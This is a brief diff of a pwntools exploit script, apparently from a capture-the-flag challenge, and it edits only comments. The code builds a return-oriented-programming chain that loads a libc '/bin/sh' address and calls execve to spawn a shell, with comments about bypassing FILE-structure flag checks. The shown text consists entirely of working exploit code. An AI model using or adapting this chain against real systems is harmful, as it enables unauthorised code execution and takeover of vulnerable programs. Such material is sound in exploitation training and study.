@@ -48,11 +48,11 @@ def rop(p):
     binsh = libc_elf.address + 0x1DB799
 
     rop_chain = (
-        pwn.p64(ret)  # avoid _flags & 0x8
+        pwn.p64(ret)  # avoid _flags & 0x8, _flags & 0x2
         + pwn.p64(pop_rdi)
         + pwn.p64(binsh)
         + pwn.p64(pop_rsi)
-        + pwn.p64(0x0)  # _IO_write_base
+        + pwn.p64(0x0)  # _IO_write_base = NULL
         + pwn.p64(libc_elf.symbols["execve"])
     )
 
